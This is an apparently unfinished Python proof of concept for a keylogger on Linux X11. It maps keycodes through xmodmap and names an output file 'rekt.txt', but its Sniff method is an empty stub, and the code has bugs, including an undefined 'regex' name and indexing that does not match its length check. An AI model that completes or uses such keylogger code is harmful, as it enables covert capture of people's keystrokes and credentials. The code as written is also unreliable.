### Trivial Keysniffing PoC
import subprocess
import os
import re

class Keysniffer():
        # Dictionary to hold keycode mapping
        KEYCODES = dict()
        def __init__(self, xinput_bin='/usr/bin/xinput', keymap=KEYCODES,\
                        outfile='rekt.txt'):
               self.xinput = xinput_bin
               self.keycodes = keymap
               self.outfile = outfile
                
        def GetKeyCodes(self):
                # Call xmodmap to get keycode mapping, pipe to stdout
                modmap_out = subprocess.Popen(
                        ('xmodmap', '-pm', '-pk'), stdout=subprocess.PIPE,
                        universal_newlines=True)
                
                # Strip whitespaces from each line, then split into lines, and split
                # those lines into lists.
                codes = []
                for line in modmap_out.stdout:
                        codes.append(str(line).strip().split())

                # Iterate through lines. If less than 3 objects in line, skip.
                # If first item of remaining lines is numeric, assign it as key in KEYCODES
                # dict, and assign the 3rd item as the value (3rd item is the name of the key)
                for line in codes:
                        if len(line) < 2:
                                pass
                        else:
                                c1 = str(line[0])
                                character_re = re.compile('\([0-9A-Za-z]\)')
                                special_re = re.compile('')
                                name = str(line[2])
                                if c1.isnumeric() and regex.match(name):
                                        self.keycodes[str(c1)] = line[2]
                        
        def CodeConverter(self, code):
                print(self.keycodes[str(code)])

        def Sniff():
                pass
        